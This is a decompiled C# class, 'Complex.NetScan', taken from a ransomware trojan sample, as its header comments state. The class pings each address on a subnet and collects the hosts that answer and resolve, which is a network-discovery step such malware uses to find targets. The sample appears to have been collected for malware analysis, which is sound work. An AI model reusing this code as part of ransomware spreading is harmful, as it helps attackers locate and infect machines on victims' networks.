// Decompiled with JetBrains decompiler
// Type: Complex.NetScan
// Assembly: Client-2, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 10231E92-BCE6-4007-A463-67D77912E754
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Ransom.Win32.Generic-ec405cc32f21680a9328c4360bd6dc5b660af66209669ca815bebceefb6c3b39.exe

using System.Collections.Generic;
using System.Net;
using System.Net.NetworkInformation;

namespace Complex
{
  public class NetScan
  {
    public static List<string> scan(string subnet)
    {
      List<string> stringList = new List<string>();
      for (int index = 1; index < (int) byte.MaxValue; ++index)
      {
        string str = "." + index.ToString();
        if (new Ping().Send(subnet + str, 900).Status == IPStatus.Success)
        {
          try
          {
            Dns.GetHostEntry(IPAddress.Parse(subnet + str));
            stringList.Add(subnet + str);
          }
          catch
          {
          }
        }
      }
      return stringList;
    }
  }
}
